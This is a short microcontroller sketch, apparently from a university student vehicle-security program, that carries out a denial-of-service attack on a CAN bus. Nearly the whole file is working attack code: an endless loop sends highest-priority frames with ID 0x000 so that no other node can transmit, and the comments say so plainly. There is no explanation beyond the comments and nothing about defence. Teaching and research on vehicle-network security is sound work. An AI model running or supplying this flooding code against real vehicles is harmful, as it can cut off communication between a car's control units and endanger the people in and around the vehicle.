//Example that creates a Denial of Service attack on a CAN bus


//John Maag
//June 2017
//University of Tulsa: Student CyberTruck Experience



#include <FlexCAN.h>
#include <kinetis_flexcan.h>
static CAN_message_t txmsg;

void setup() {

 //baud rate for can network, change appropriately
 Can0.begin(250000);
 Serial.begin(9600);
 
 delay(200);
 Serial.println("Overloaded Bus with Messages:");
 delay(2);
}
void loop() {

  //Serial.println();
  //Serial.println("Sending");


  //creates and sends message continuously,
  //no other node on Bus will be able to send messages
  while (true){
    txmsg.id = 0x000;
    txmsg.len = 8;
    txmsg.buf[0] = 0;
    txmsg.buf[1] = 0;
    txmsg.buf[2] = 0;
    txmsg.buf[3] = 0;
    txmsg.buf[4] = 0;
    txmsg.buf[5] = 0;
    txmsg.buf[6] = 0;
    txmsg.buf[7] = 0;
    Can0.write(txmsg);
  }
}
